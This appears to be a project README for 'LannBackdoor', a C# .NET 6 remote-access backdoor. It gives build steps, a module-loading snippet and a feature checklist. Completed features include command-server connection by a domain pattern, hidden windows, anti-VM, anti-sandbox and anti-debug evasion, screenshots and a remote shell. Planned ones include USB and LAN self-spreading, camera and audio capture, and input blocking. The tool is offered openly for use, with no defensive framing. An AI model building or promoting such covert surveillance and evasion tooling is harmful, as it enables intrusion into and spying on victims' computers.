# LannBackdoor
--- This is backdoor written in C# using .NET 6

### Prerequisites
- This project is using `.NET 6` so you need to install it

### Installing
1. Clone Repository
```sh
$ git clone https://github.com/Luminate-D/LannBackdoor.git
```

2. Open `LannBackdoor.sln` with your IDE (VS / JetBrains Rider)
3. Restore NuGet Packages

### Building & Running
- Make your changes and build & run using the button in the IDE

##### If you have got any issues, feel free to report them at the [issues page](https://github.com/Luminate-D/LannBackdoor/issues)

### Loading Modules
- Modules and their dependencies are loaded by server
- If you want to bundle module with backdoor, insert this code inside `Program.cs`
```cs
ModuleRegistry.LoadByAssembly(typeof(HERE_PUT_MODULE_CLASS).Assembly);
```

## Features & TODO List
- [x] Connecting to server using pattern xxxx-{0}.dom
- [x] Hiding window when Debug = false
- [ ] USB Spread
- [ ] LAN Spread
- [x] Anti VM / Fake Environment / Sandbox
- [x] Anti Debug
- [ ] Modules
  - [x] System Module - Loaded by default
    - [x] Ping
    - [x] RSA Verify - Verify that server is original
    - [x] Load Assembly - Load assemblies required by other modules
    - [x] Load Module - Load modules
    - [x] List Modules
  - [x] Screen Module
    - [x] Take Screenshot
    - [ ] Record Video
    - [ ] UDP Video Streaming
      - [ ] Quality Settings
      - [ ] FPS Settings
    - [ ] GDI+ Addon
      - [ ] Draw image over screen
      - [ ] Play GIF/MP4 over screen
      - [ ] Glitching / Screen Floating
  - [x] Shell Module
    - [x] Open / Close Shell (by ID)
    - [x] Write Commands to Shell
    - [x] Log <std>, open, close back
  - [ ] FS Module
    - [ ] Download File
    - [ ] Upload File
    - [ ] Upload ZIP Archived Folder
  - [ ] Audio Module
    - [ ] Record Audio
    - [ ] UDP Audio Streaming (Two sides)
    - [ ] Play Audio
  - [ ] Camera Module
    - [ ] Take Camera Snapshot
    - [ ] Record Video
    - [ ] UDP Video Streaming
  - [ ] Fun Module
    - [ ] Block Input (Keyboard / Mouse)
    - [ ] Inverse Mouse
    - [ ] Show / Hide Mouse
    - [ ] Turn monitor off
    - [ ] Shutdown / Restart PC
    - [ ] Force Keyboard Write
  - [ ] Other
    - [ ] Install Driver
    - [ ] Printer (der Drucker)
      - [ ] Print Local Image / From URL
